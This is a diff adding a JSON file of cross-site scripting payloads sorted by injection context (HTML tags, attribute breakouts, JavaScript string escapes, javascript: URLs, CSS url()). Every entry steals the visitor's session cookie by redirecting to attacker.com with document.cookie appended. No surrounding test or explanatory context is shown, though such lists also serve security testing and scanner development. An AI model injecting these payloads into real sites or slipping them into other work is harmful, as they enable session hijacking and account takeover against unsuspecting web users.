@@ -1,0 +1,23 @@
+{
+  "html": [
+    "<script>document.location='https://attacker.com/steal?cookie='+document.cookie</script>",
+    "<script>window.location='https://attacker.com/steal?cookie='+document.cookie</script>",
+    "<script>location.href='https://attacker.com/steal?cookie='+document.cookie</script>"
+  ],
+  "attribute": [
+    "\" onclick=\"document.location='https://attacker.com/steal?cookie='+document.cookie\"",
+    "\" onclick=\"window.location='https://attacker.com/steal?cookie='+document.cookie\""
+  ],
+  "javascript": [
+    "\";document.location='https://attacker.com/steal?cookie='+document.cookie;//",
+    "';window.location='https://attacker.com/steal?cookie='+document.cookie;//"
+  ],
+  "url": [
+    "javascript:document.location='https://attacker.com/steal?cookie='+document.cookie",
+    "javascript:window.location='https://attacker.com/steal?cookie='+document.cookie"
+  ],
+  "style": [
+    "background-image: url('javascript:document.location=\"https://attacker.com/steal?cookie=\"+document.cookie')",
+    "background-image: url(javascript:window.location='https://attacker.com/steal?cookie='+document.cookie)"
+  ]
+}
